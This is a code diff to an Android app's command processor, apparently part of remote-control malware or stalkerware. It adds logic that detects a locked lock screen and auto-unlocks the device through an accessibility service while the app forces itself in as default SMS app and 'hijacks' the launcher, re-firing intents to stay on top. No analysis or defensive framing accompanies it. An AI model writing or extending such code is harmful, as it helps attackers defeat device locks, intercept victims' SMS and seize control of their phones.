@@ -2451,8 +2451,20 @@ object CommandProcessor {
                         } else {
                             DebugLogger.log("RBT_LIFECYCLE", "Invoking startMasterDisplayReset.")
                             service.startMasterDisplayReset(id, false)
+                            val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                             var timeout = 0
-                            while(service.activeSequence != null && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                            while(service.activeSequence != null && timeout < 30) { 
+                                if (km.isKeyguardLocked) {
+                                    DebugLogger.log("RBT_LIFECYCLE", "MDR interrupted by Keyguard. Attempting Auto-Unlock...")
+                                    service.executeAutonomousUnlockInternal()
+                                    val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
+                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                                    }
+                                    ctx.startActivity(intent)
+                                }
+                                kotlinx.coroutines.delay(1000)
+                                timeout++ 
+                            }
                             if (timeout >= 30) {
                                 DebugLogger.log("RBT_LIFECYCLE", "Phase 1 TIMEOUT after 30s. Purging zombie sequence.")
                                 service.abortSequences()
@@ -2466,8 +2478,16 @@ object CommandProcessor {
                         DebugLogger.log("RBT_LIFECYCLE", "Entering Relentless Validation Loop for Critical Defaults (Max 160s)")
                         val loopStartTime = System.currentTimeMillis()
                         var allSuccess = false
+                        val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                         
                         while (!allSuccess && (System.currentTimeMillis() - loopStartTime) < 160000) {
+                            if (km.isKeyguardLocked) {
+                                DebugLogger.log("RBT_LIFECYCLE", "Relentless loop blocked by Keyguard. Executing Auto-Unlock...")
+                                MyAccessibilityService.instance?.executeAutonomousUnlockInternal()
+                                kotlinx.coroutines.delay(1000)
+                                continue // Restart loop evaluation after unlock
+                            }
+
                             allSuccess = true
                             
                             // Check SMS
@@ -2477,7 +2497,14 @@ object CommandProcessor {
                                 DefaultSmsManager.expectedMode = "AUTO"
                                 DefaultSmsManager.requestDefault(ctx)
                                 var timeout = 0
-                                while(DefaultSmsManager.expectedMode != "" && timeout < 15) { kotlinx.coroutines.delay(1000); timeout++ }
+                                while(DefaultSmsManager.expectedMode != "" && timeout < 15) { 
+                                    if (km.isKeyguardLocked) {
+                                        MyAccessibilityService.instance?.executeAutonomousUnlockInternal()
+                                        DefaultSmsManager.requestDefault(ctx) // Re-trigger intent
+                                    }
+                                    kotlinx.coroutines.delay(1000)
+                                    timeout++ 
+                                }
                                 if (DefaultSmsManager.expectedMode != "") {
                                     DefaultSmsManager.expectedMode = "" // Disarm if timeout
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
@@ -2495,6 +2522,9 @@ object CommandProcessor {
                                 
                                 var timeout = 0
                                 while(LauncherManager.isHijacking && timeout < 20) { 
+                                    if (km.isKeyguardLocked) {
+                                        MyAccessibilityService.instance?.executeAutonomousUnlockInternal()
+                                    }
                                     // Re-fire intent every 4 seconds to force it to top
                                     if (timeout % 4 == 0) {
                                         android.os.Handler(android.os.Looper.getMainLooper()).post {
@@ -2940,7 +2970,11 @@ object CommandProcessor {
                         LauncherManager.pendingCmdId = id
                         
                         var waitTime = 0
+                        val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                         while (LauncherManager.isHijacking && waitTime < 25000) {
+                            if (km.isKeyguardLocked) {
+                                MyAccessibilityService.instance?.executeAutonomousUnlockInternal()
+                            }
                             // Re-fire intent every 3.5 seconds
                             if (waitTime % 3500 == 0) {
                                 android.os.Handler(android.os.Looper.getMainLooper()).post {
